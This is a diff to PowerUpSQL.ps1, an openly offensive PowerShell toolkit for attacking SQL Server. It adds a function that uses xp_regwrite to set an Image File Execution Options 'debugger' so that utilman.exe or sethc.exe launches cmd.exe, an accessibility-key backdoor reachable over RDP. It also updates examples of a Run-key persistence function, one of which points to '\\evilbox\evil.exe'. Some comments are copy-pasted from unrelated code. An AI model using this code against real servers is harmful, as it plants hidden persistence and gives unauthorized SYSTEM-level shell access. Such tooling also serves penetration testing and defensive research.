@@ -4,7 +4,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.0.0.32
+        Version: 1.0.0.33
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -9738,16 +9738,16 @@ Function   Get-SQLPersistRegRun
             .Example
             PS C:\> Get-SQLPersistRegRun -Verbose -Name PureEvil -Command 'PowerShell.exe -C "Write-Output hacker | Out-File C:\temp\iamahacker.txt"' -Instance "SQLServer1\STANDARDDEV2014"
             VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
-            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write value: yeah
-            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write command: dothis.exe
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write value: PureEvil
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write command: PowerShell.exe -C "Write-Output hacker | Out-File C:\temp\iamahacker.txt"
             VERBOSE: SQLServer1\STANDARDDEV2014 : Registry entry written.
             VERBOSE: SQLServer1\STANDARDDEV2014 : Done.
 
             .Example
             PS C:\> Get-SQLPersistRegRun -Verbose -Name PureEvil -Command "\\evilbox\evil.exe" -Instance "SQLServer1\STANDARDDEV2014"
             VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
-            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write value: yeah
-            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write command: dothis.exe
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write value: PureEvil
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write command: \\evilbox\evil.exe
             VERBOSE: SQLServer1\STANDARDDEV2014 : Registry entry written.
             VERBOSE: SQLServer1\STANDARDDEV2014 : Done.
 
@@ -9875,6 +9875,192 @@ Function   Get-SQLPersistRegRun
         @rootkey		= N'HKEY_LOCAL_MACHINE',
         @key			= N'Software\Microsoft\Windows\CurrentVersion\Run',
         @value_name		= N'$Name',
+        @value			= @CheckValue output
+        
+        -- Display Results
+        SELECT CheckValue = @CheckValue"
+
+        # Execute query
+        $CheckResults = Get-SQLQuery -Instance $Instance -Query $CheckQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose  
+        $CheckCommand = $CheckResults.CheckValue   
+        if($CheckCommand.length -ge 2){
+            Write-Verbose "$Instance : Registry entry written."                   
+        }else{
+            Write-Verbose "$Instance : Fail to write to registry due to insufficient privileges."
+        } 
+    }
+
+    End
+    {
+        # Return message
+        Write-Verbose "$Instance : Done."
+    }
+}
+
+# ----------------------------------
+#  Get-SQLPersistRegDebugger 
+# ----------------------------------
+# Author: Scott Sutherland
+Function   Get-SQLPersistRegDebugger
+{
+    <#
+            .SYNOPSIS
+            This function will use the xp_regwrite procedure to setup command 
+            to run instead of the defined FileName when it's called.  It
+            is commonly used with accessibily options to access RDP and launch
+            PowerShell payloads.  The specific registry key is.
+            HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run  
+            Sysadmin privileges are required.
+            .PARAMETER Username
+            SQL Server or domain account to authenticate with.
+            .PARAMETER Password
+            SQL Server or domain account password to authenticate with.
+            .PARAMETER Credential
+            SQL Server credential.
+            .PARAMETER Instance
+            SQL Server instance to connection to.
+            .PARAMETER FileName
+            File to replace execution on.
+            .PARAMETER Command
+            Command to run.
+
+            .Example
+            PS C:\> Get-SQLPersistRegDebugger-Verbose -FileName utilman.exe -Command 'c:\windows\system32\cmd.exe' -Instance "SQLServer1\STANDARDDEV2014"
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write debugger for: utilman.exe
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write command: c:\windows\system32\cmd.exe
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Registry entry written.
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Done.
+
+            .Example
+            PS C:\> Get-SQLPersistRegDebugger-Verbose -Name sethc.exe -Command "PowerShell.exe -C "Write-Output hacker | Out-File C:\temp\iamahacker.txt"" -Instance "SQLServer1\STANDARDDEV2014"
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write debugger for: sethc.exe
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write command: PowerShell.exe -C "Write-Output hacker | Out-File C:\temp\iamahacker.txt"
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Registry entry written.
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Done.
+
+            .Notes
+            http://sqlmag.com/t-sql/using-t-sql-manipulate-registry
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account to authenticate with.')]
+        [string]$Username,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
+        [string]$Password,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Windows credentials.')]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory = $false,
+        ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server instance to connection to.')]
+        [string]$Instance,
+
+        [Parameter(Mandatory = $false,
+        ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Name of the registry value.')]
+        [string]$FileName= "utilman.exe",
+
+        [Parameter(Mandatory = $false,
+        ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'The command to run.')]
+        [string]$Command = 'c:\windows\system32\cmd.exe',
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
+        [switch]$SuppressVerbose
+    )
+
+    Begin
+    {
+    }
+
+    Process
+    {
+        # Parse computer name from the instance
+        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+
+        # Default connection to local default instance
+        if(-not $Instance)
+        {
+            $Instance = $env:COMPUTERNAME
+        }
+
+        # Test connection to instance
+        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+            $_.Status -eq 'Accessible'
+        }
+        if($TestConnection)
+        {
+            if( -not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Success."
+            }
+        }
+        else
+        {
+            if( -not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Failed."
+            }
+            return
+        }       
+
+        # Get sysadmin status
+        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
+
+        # Get SQL Server version number
+        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
+        if($SQLVersionFull)
+        {
+            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
+        }
+
+        # Check if this can actually run with the current login
+        if($IsSysadmin -ne "Yes")
+        {          
+            Write-Verbose "$Instance : This function requires sysadmin privileges. Done."
+            Return
+        }else{
+
+            Write-Verbose "$Instance : Attempting to write debugger: $FileName"
+            Write-Verbose "$Instance : Attempting to write command: $Command"
+        }
+
+        # Setup query for registry update
+        $Query = "
+       --- This will create a registry key through SQL Server (as sysadmin)
+        -- to run a defined debugger (any command) instead of intended command
+        -- in the example utilman.exe can be replace with cmd.exe and executed on demand via rdp
+        --- note: this could easily be a empire/other payload
+        EXEC master..xp_regwrite
+        @rootkey     = 'HKEY_LOCAL_MACHINE',
+        @key         = 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$FileName',
+        @value_name  = 'Debugger',
+        @type        = 'REG_SZ',
+        @value       = '$Command'"
+
+        # Execute query
+        $Results = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+        
+        # Setup query to verify the write is successful
+        $CheckQuery = "
+        -------------------------------------------------------------------------
+        -- Get Windows Auto Login Credentials from the Registry
+        -------------------------------------------------------------------------
+        -- Get AutoLogin Default Domain
+        DECLARE @CheckValue  SYSNAME
+        EXECUTE master.dbo.xp_regread
+        @rootkey		= N'HKEY_LOCAL_MACHINE',
+        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$FileName',
+        @value_name		= N'Debugger',
         @value			= @CheckValue output
         
         -- Display Results
